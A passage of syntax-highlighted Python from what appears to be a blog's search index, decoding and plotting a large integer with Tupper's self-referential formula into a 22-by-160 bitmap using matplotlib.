tupper_self_referential_formula(k, width, height)</span><br><span class="line">    plt.figure(figsize=(<span class="number">15</span>, <span class="number">10</span>))</span><br><span class="line">    plt.imshow(rst, origin=origin)</span><br><span class="line">    plt.savefig(filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = <span class="number">92898203278702907929705938676672021500394791427205757369123489204565300324859717082409892641951206664564991991489354661871425872649524078000948199832659815275909285198829276929014694628110159824930931595166203271443269827449505707655085842563682060910813942504507936625555735585913273575050118552353192682955310220323463465408645422334101446471078933149287336241772448338428740302833855616421538520769267636119285948674549756604384946996184385407505456168240123319785800909933214695711828013483981731933773017336944656397583872267126767778549745087854794302808950100966582558761224454242018467578959766617176016660101690140279961968740323327369347164623746391335756442566959352876706364265509834319910419399748338894746638758652286771979896573695823608678008814861640308571256880794312652055957150464513950305355055495262375870102898500643010471425931450046440860841589302890250456138060738689526283389256801969190204127358098408264204643882520969704221896973544620102494391269663693407573658064279947688509910028257209987991480259150865283245150325813888942058</span></span><br><span class="line"></span><br><span class="line">rst = tupper_to_str(k, <span class="number">22</span>, <span class="number">160</span>)</span><br><span class="line"><span class="built_in">print</span>(rst)</span><br><span class="line">tupper_to_img(k, <span class="number">22</span>, <span class="number">160</span>)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>note</tag>
       </tags>
   </entry>
 </search>
